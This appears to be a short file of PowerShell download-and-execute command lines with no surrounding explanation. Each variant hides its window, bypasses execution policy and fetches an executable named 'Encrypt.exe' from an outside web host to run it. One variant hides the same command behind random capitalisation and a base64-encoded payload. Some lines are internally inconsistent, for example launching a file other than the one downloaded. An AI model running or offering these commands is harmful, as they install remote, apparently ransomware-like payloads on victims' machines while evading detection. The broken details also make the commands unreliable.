powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://www.ukks.net/controls/Encrypt.exe',"$env:APPDATA\Encrypt.exe");Start-Process ("$env:APPDATA\ps.exe")


## Version1
c:\Windows\System32\cmd.exe /c powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('http://www.ukks.net/controls/Encrypt.exe')"


## Version2
c:\windows\system32\cmd.exe /c PowErsHelL.EXE -eXecUtiONPoLICy bYPass -NOPROfilE -WinDoWSTYlE hiDden -EnCodeDcOmmAnd KE5ldy1PYkplQ1Qgc1lzdEVtLm5lVC53ZWJDbElFTlQpLkRPV25sb2FkRklsZSgnaHR0cDovL3d3dy51a2tzLm5ldC9jb250cm9scy9FbmNyeXB0LmV4ZScsIiRlbnY6QVBQREFUQVxFbmNyeXB0LmV4ZSIp